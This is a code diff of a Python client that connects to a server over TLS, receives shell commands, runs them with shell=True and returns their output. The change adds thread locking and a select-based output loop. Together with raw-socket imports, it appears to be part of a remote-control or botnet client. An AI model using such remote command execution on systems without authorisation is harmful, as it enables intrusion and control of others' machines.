@@ -6,6 +6,7 @@ from sys import argv, modules
 from time import sleep
 from subprocess import Popen, PIPE
 from multiprocessing import Process, freeze_support
+from threading import Lock
 from socket import (socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM,
                     SOCK_RAW, AF_INET)
 from socket import error as sock_error
@@ -97,6 +98,7 @@ class Client(object):
         # All PROTOCOL consts are merged on TLS in Python2.7.13
         cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
     sock = cntx.wrap_socket(sock)
+    thread_lock = Lock()
 
     def __init__(self, addr, port=9000):
         # self.pipe = None
@@ -203,15 +205,17 @@ class Client(object):
         """Send data to Server."""
         r_code = 0
         try:
-            Client.sock.send(data)
-        except sock_error:
+            with self.thread_lock:
+                self.sock.send(data)
+        except sock_error as err:
             r_code = 1
             self.reconnect()
         return r_code
 
     def receive(self, size):
         """Receive data from Server."""
-        data = Client.sock.recv(size)
+        with self.thread_lock:
+            data = self.sock.recv(size)
         if data == '':
             self.reconnect()
             raise sock_error
@@ -226,40 +230,36 @@ class Client(object):
 
     def run_cm(self):
         """Get command to run from server, execute it and send results back."""
+        import select
         command_size = self.receive(13)
         command = self.receive(int(command_size))
+        last_stdout = None
+        stdout = ""
         comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
-        # self.pipe = comm
         killed = False
-        while not comm.returncode and not killed:
-            en_data = self.receive(5)
-            try:
-                en_data = self.comm_dict[en_data]
-            except KeyError:
-                continue
-            if en_data == 'KILL':
-                proc.terminate()
-                killed = True
-                data = comm.stdout.read()
-                len_send = get_len(data, 13)
+        while (not killed and (comm.returncode is None or last_stdout != '')):
+            ready = select.select([self.sock, comm.stdout], [], [])[0][0]
+            if isinstance(ready, ssl.SSLSocket):
+                en_data = self.receive(5)
+                try:
+                    en_data = self.comm_dict[en_data]
+                except KeyError:
+                    continue
+                if en_data == 'KILL':
+                    killed = True
             else:
-                data = comm.stdout.readline()
-                len_send = get_len(data, 3)
-            en_stdout = self.send(len_send)
-            if en_stdout == 0:
-                en_stdout = self.send(data)
-
-        stdout, stderr = comm.communicate()
-        if stderr:
-            decode = stderr.decode('UTF-8')
-        elif stdout:
-            decode = stdout.decode('UTF-8')
+                last_stdout = ready.readline()
+                stdout += last_stdout
+            comm.poll()
+        if not killed:
+            self.send('done')
         else:
-            decode = 'Command has no output'
-        len_decode = get_len(decode, 13)
-        en_stdout = self.send(len_decode)
-        if en_stdout == 0:
-            en_stdout = self.send(decode)
+            comm.terminate()
+        if not stdout:
+            stdout = "None"
+        len_send = get_len(stdout, 13)
+        en_stdout = self.send(len_send)
+        en_stdout = self.send(stdout)
         return 0
 
     def run_plugin_cm(self):
